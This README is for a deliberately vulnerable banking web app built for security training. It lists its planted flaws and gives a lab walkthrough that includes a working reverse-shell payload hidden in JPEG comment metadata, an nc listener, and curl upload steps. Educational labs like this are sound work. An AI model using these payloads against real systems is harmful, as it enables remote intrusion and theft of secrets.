# Geeks Bank - Vulnerable Banking Application

Geeks Bank is a deliberately vulnerable web application designed for cybersecurity education, penetration testing practice, and Capture The Flag (CTF) simulations.

This application demonstrates various popular security flaws based on the **OWASP Top 10** in a real-world digital banking scenario.

---

## 🚀 Key Features
* **Authentication & Registration**: Customer login and registration system.
* **Fund Transfer**: Transfer funds between Geeks Bank customer accounts.
* **Top Up & Bill Payment**: Balance top-up and transaction bill payment features.
* **Admin Panel**: Administrative console to manage customers and view banking statistics.
* **Open API Documentation**: Public API documentation page (Swagger).

---

## 🛠️ Tech Stack
* **Backend**: Node.js & Express.js
* **Database**: SQLite (In-Memory Database for easy data reset)
* **Frontend**: Vanilla HTML, CSS, & JavaScript
* **Containerization**: Docker & Docker Compose

---

## 🐳 Running the Application

The application is configured to run on port **`3000`** by default to prevent conflicts with proxy testing tools like **Burp Suite** (which typically use port `8080`).

### Method 1: Using Docker Compose (Highly Recommended)
This is the **recommended** way to run the lab: the container (Node.js 22 on Alpine Linux) ships
with **ImageMagick** and a shell, so **every** vulnerability works end-to-end — including the
avatar-upload **Remote Code Execution (RCE)** and reverse shell.

Ensure Docker Desktop is installed and running, then from the project root:

```bash
# Build the image and start the lab
docker compose up --build

# ...to stop it later:
docker compose down
```
Access the application via your browser at: **`http://localhost:3000`**

> The container is named `vuln-geeks-bank`. The source folder is bind-mounted, so after editing
> `server.js` (or other files) just restart the container to apply changes — no rebuild needed.

### Method 2: Running Locally (Node.js)
Ensure Node.js is installed (version 20+ recommended), then run:

```bash
# Install project dependencies
npm install

# Start the server
npm start
```
Access the application via your browser at: **`http://localhost:3000`**

> Note: on a bare Node.js host without **ImageMagick** installed, the avatar-upload RCE (#16)
> still executes injected commands, but the thumbnail step degrades gracefully. For the full lab
> experience (and the reverse shell walkthrough below), use **Method 1 (Docker)**.

### Verifying the vulnerabilities
With the lab running, you can auto-check the deliberate flaws from the host:
```bash
node test_vulnerabilities.js
```

---

## ⚠️ List of Vulnerabilities
This application contains various security flaws that are documented in detail in the **`vulnerability_list.md`** file. Some of the vulnerabilities include:
* **SQL Injection (SQLi)** on the login page.
* **Broken Object Level Authorization (BOLA / IDOR)** on the change password feature.
* **Broken Function Level Authorization (BFLA)** on the admin panel.
* **Insecure File Upload** allowing web shell uploads.
* **Server-Side Request Forgery (SSRF) & Remote File Inclusion (RFI)** on the avatar URL import feature.
* Authentication bypass using the JWT `none` algorithm.
* **OS Command Injection → Remote Code Execution (RCE)** via the avatar upload (image comment metadata).

---

## 🧪 Lab Walkthrough: RCE Reverse Shell (Local Docker)

This walkthrough demonstrates escalating the avatar-upload command injection (Vulnerability #16)
into an interactive **reverse shell**, running entirely on your machine. Full payload variants and
remediation notes are in **`vulnerability_list.md`**.

**Setup:** the target runs inside the `vuln-geeks-bank` container (Method 1 above); the attacker
tools run on your host. From inside the container, your host is reachable as
**`host.docker.internal`** — use that as the callback address.

**1. Start a listener on the host** (use `ncat` from Nmap, or `nc` in WSL/Git Bash):
```bash
ncat -lvnp 4444
```

**2. Craft a malicious image** — embed the payload in a real image's JPEG comment metadata
(`ATTACKER_IP` → `host.docker.internal`):
```bash
exiftool -Comment='"; rm -f /tmp/f; mkfifo /tmp/f; (cat /tmp/f | /bin/sh -i 2>&1 | nc host.docker.internal 4444 > /tmp/f) & echo "' avatar.jpg
```

**3. Get a token and upload** (the front-end filter is client-side only, so send it directly):
```bash
TOKEN=$(curl -s http://localhost:3000/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"rangga@geekswarrior.id","password":"hunter2"}' | jq -r .token)

curl -s -X POST http://localhost:3000/api/upload -H "Authorization: Bearer $TOKEN" \
  -F 'avatar=@avatar.jpg;type=image/jpeg'
```

**4. Catch the shell** — an interactive `/bin/sh` connects back to your listener as the Node process
user. Try `id`, `cat /app/server.js`, or `env` (leaks `JWT_SECRET`).

**Warm-up check (no listener needed)** — prove code execution via the reflected output field:
```bash
exiftool -Comment='"; id; uname -a; echo "' avatar.jpg
curl -s -X POST http://localhost:3000/api/upload -H "Authorization: Bearer $TOKEN" \
  -F 'avatar=@avatar.jpg;type=image/jpeg' | jq -r .processingLog
```

> The reverse-shell payload is detached (`& ...`) so it survives the 10-second `child_process.exec`
> timeout. Without detaching, the shell would drop after ~10 seconds.

---

> [!WARNING]
> **DISCLAIMER**: This application contains severe security vulnerabilities, including **real Remote Code Execution**. **NEVER** deploy this application to a production server or expose it directly to the public internet — anyone who finds it could gain a shell on the host. Use it only in an isolated local environment for educational purposes.
